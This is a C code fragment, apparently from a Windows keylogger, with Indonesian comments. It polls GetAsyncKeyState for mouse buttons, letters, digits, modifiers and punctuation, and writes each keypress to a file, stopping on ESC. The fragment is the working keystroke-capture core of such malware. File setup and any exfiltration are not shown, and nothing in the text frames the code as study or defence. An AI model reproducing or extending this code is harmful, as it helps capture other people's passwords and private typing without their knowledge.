// Baris 1: [MOUSE1]
if ((GetAsyncKeyState(1) & 0x8000) && !isKeyDown(1)) {
    fputs("[MOUSE1]\n", fp);
    fflush(fp);
    setKeyDown(1);
} else if (!(GetAsyncKeyState(1) & 0x8000)) {
    clearKeyDown(1);
}

// Baris 2: [MOUSE2]
if ((GetAsyncKeyState(2) & 0x8000) && !isKeyDown(2)) {
    fputs("[MOUSE2]\n", fp);
    fflush(fp);
    setKeyDown(2);
} else if (!(GetAsyncKeyState(2) & 0x8000)) {
    clearKeyDown(2);
}

// Baris 3: [BACKSPACE]
if ((GetAsyncKeyState(8) & 0x8000) && !isKeyDown(3)) {
    fputs("[BACKSPACE]\n", fp);
    fflush(fp);
    setKeyDown(3);
} else if (!(GetAsyncKeyState(8) & 0x8000)) {
    clearKeyDown(3);
}

// Baris 4: [TAB]
if ((GetAsyncKeyState(9) & 0x8000) && !isKeyDown(4)) {
    fputs("[TAB]\n", fp);
    fflush(fp);
    setKeyDown(4);
} else if (!(GetAsyncKeyState(9) & 0x8000)) {
    clearKeyDown(4);
}

// Baris 5: [ENTER]
if ((GetAsyncKeyState(13) & 0x8000) && !isKeyDown(5)) {
    fputs("[ENTER]\n", fp);
    fflush(fp);
    setKeyDown(5);
} else if (!(GetAsyncKeyState(13) & 0x8000)) {
    clearKeyDown(5);
}

// Baris 6: [SHIFT]
if ((GetAsyncKeyState(16) & 0x8000) && !isKeyDown(6)) {
    fputs("[SHIFT]\n", fp);
    fflush(fp);
    setKeyDown(6);
} else if (!(GetAsyncKeyState(16) & 0x8000)) {
    clearKeyDown(6);
}

// Baris 7: [CAPS]
if ((GetAsyncKeyState(20) & 0x8000) && !isKeyDown(7)) {
    fputs("[CAPS]\n", fp);
    fflush(fp);
    setKeyDown(7);
} else if (!(GetAsyncKeyState(20) & 0x8000)) {
    clearKeyDown(7);
}

// Baris 8: [ESC] - Digunakan juga untuk keluar dari loop
if ((GetAsyncKeyState(27) & 0x8000) && !isKeyDown(8)) {
    fputs("[ESC]\n", fp);
    fflush(fp);
    setKeyDown(8);
    // If ESC is pressed, exit the program
    break;
} else if (!(GetAsyncKeyState(27) & 0x8000)) {
    clearKeyDown(8);
}

// Baris 9: [SPACE]
if ((GetAsyncKeyState(32) & 0x8000) && !isKeyDown(9)) {
    fputs("[SPACE]\n", fp);
    fflush(fp);
    setKeyDown(9);
} else if (!(GetAsyncKeyState(32) & 0x8000)) {
    clearKeyDown(9);
}

// Baris 10: [DEL]
if ((GetAsyncKeyState(46) & 0x8000) && !isKeyDown(10)) {
    fputs("[DEL]\n", fp);
    fflush(fp);
    setKeyDown(10);
} else if (!(GetAsyncKeyState(46) & 0x8000)) {
    clearKeyDown(10);
}

// Baris 11-20: [0-9] (Virtual Key Codes 48-57)
for (int i = 0; i <= 9; ++i) {
    int vk_code = 48 + i;
    int index = 11 + i;
    if ((GetAsyncKeyState(vk_code) & 0x8000) && !isKeyDown(index)) {
        fprintf(fp, "[%d]\n", i);
        fflush(fp);
        setKeyDown(index);
    } else if (!(GetAsyncKeyState(vk_code) & 0x8000)) {
        clearKeyDown(index);
    }
}

// Baris 21-46: [A-Z] (Virtual Key Codes 65-90)
for (int i = 0; i <= 25; ++i) {
    int vk_code = 65 + i;
    int index = 21 + i;
    if ((GetAsyncKeyState(vk_code) & 0x8000) && !isKeyDown(index)) {
        fprintf(fp, "[%c]\n", (char)('A' + i));
        fflush(fp);
        setKeyDown(index);
    } else if (!(GetAsyncKeyState(vk_code) & 0x8000)) {
        clearKeyDown(index);
    }
}

// Baris 47: [MOD] - Assuming VK_LWIN/VK_RWIN (Windows Key)
if ((GetAsyncKeyState(91) & 0x8000) && !isKeyDown(47)) {
    fputs("[MOD]\n", fp);
    fflush(fp);
    setKeyDown(47);
} else if (!(GetAsyncKeyState(91) & 0x8000)) {
    clearKeyDown(47);
}

// Baris 48-49: [CTRL] (VK_LCONTROL 162, VK_RCONTROL 163)
if ((GetAsyncKeyState(162) & 0x8000) && !isKeyDown(48)) {
    fputs("[CTRL_LEFT]\n", fp);
    fflush(fp);
    setKeyDown(48);
} else if (!(GetAsyncKeyState(162) & 0x8000)) {
    clearKeyDown(48);
}
if ((GetAsyncKeyState(163) & 0x8000) && !isKeyDown(49)) {
    fputs("[CTRL_RIGHT]\n", fp);
    fflush(fp);
    setKeyDown(49);
} else if (!(GetAsyncKeyState(163) & 0x8000)) {
    clearKeyDown(49);
}

// Baris 50-51: [ALT] (VK_LMENU 164, VK_RMENU 165)
if ((GetAsyncKeyState(164) & 0x8000) && !isKeyDown(50)) {
    fputs("[ALT_LEFT]\n", fp);
    fflush(fp);
    setKeyDown(50);
} else if (!(GetAsyncKeyState(164) & 0x8000)) {
    clearKeyDown(50);
}
if ((GetAsyncKeyState(165) & 0x8000) && !isKeyDown(51)) {
    fputs("[ALT_RIGHT]\n", fp);
    fflush(fp);
    setKeyDown(51);
} else if (!(GetAsyncKeyState(165) & 0x8000)) {
    clearKeyDown(51);
}

// Baris 52: [;]
if ((GetAsyncKeyState(186) & 0x8000) && !isKeyDown(52)) {
    fputs("[;]\n", fp);
    fflush(fp);
    setKeyDown(52);
} else if (!(GetAsyncKeyState(186) & 0x8000)) {
    clearKeyDown(52);
}

// Baris 53: [PLUS]
if ((GetAsyncKeyState(187) & 0x8000) && !isKeyDown(53)) {
    fputs("[PLUS]\n", fp);
    fflush(fp);
    setKeyDown(53);
} else if (!(GetAsyncKeyState(187) & 0x8000)) {
    clearKeyDown(53);
}

// Baris 54: [,]
if ((GetAsyncKeyState(188) & 0x8000) && !isKeyDown(54)) {
    fputs("[,]\n", fp);
    fflush(fp);
    setKeyDown(54);
} else if (!(GetAsyncKeyState(188) & 0x8000)) {
    clearKeyDown(54);
}

// Baris 55: [MIN]
if ((GetAsyncKeyState(189) & 0x8000) && !isKeyDown(55)) {
    fputs("[MIN]\n", fp);
    fflush(fp);
    setKeyDown(55);
} else if (!(GetAsyncKeyState(189) & 0x8000)) {
    clearKeyDown(55);
}

// Baris 56: [.]
if ((GetAsyncKeyState(190) & 0x8000) && !isKeyDown(56)) {
    fputs("[.]\n", fp);
    fflush(fp);
    setKeyDown(56);
} else if (!(GetAsyncKeyState(190) & 0x8000)) {
    clearKeyDown(56);
}

// Baris 57: [/]
if ((GetAsyncKeyState(191) & 0x8000) && !isKeyDown(57)) {
    fputs("[/]\n", fp);
    fflush(fp);
    setKeyDown(57);
} else if (!(GetAsyncKeyState(191) & 0x8000)) {
    clearKeyDown(57);
}

// Baris 58: [`]
if ((GetAsyncKeyState(192) & 0x8000) && !isKeyDown(58)) {
    fputs("[`]\n", fp);
    fflush(fp);
    setKeyDown(58);
} else if (!(GetAsyncKeyState(192) & 0x8000)) {
    clearKeyDown(58);
}

// Baris 59: [ [ ]
if ((GetAsyncKeyState(219) & 0x8000) && !isKeyDown(59)) {
    fputs("[[ ]\n", fp);
    fflush(fp);
    setKeyDown(59);
} else if (!(GetAsyncKeyState(219) & 0x8000)) {
    clearKeyDown(59);
}

// Baris 60: [ \ ]
if ((GetAsyncKeyState(220) & 0x8000) && !isKeyDown(60)) {
    fputs("[ \\ ]\n", fp);
    fflush(fp);
    setKeyDown(60);
} else if (!(GetAsyncKeyState(220) & 0x8000)) {
    clearKeyDown(60);
}

// Baris 61: [ ] ]
if ((GetAsyncKeyState(221) & 0x8000) && !isKeyDown(61)) {
    fputs("[ ] ]\n", fp);
    fflush(fp);
    setKeyDown(61);
} else if (!(GetAsyncKeyState(221) & 0x8000)) {
    clearKeyDown(61);
}

// Baris 62: [']
if ((GetAsyncKeyState(222) & 0x8000) && !isKeyDown(62)) {
    fputs("[']\n", fp);
    fflush(fp);
    setKeyDown(62);
} else if (!(GetAsyncKeyState(222) & 0x8000)) {
    clearKeyDown(62);
}

Sleep(10);
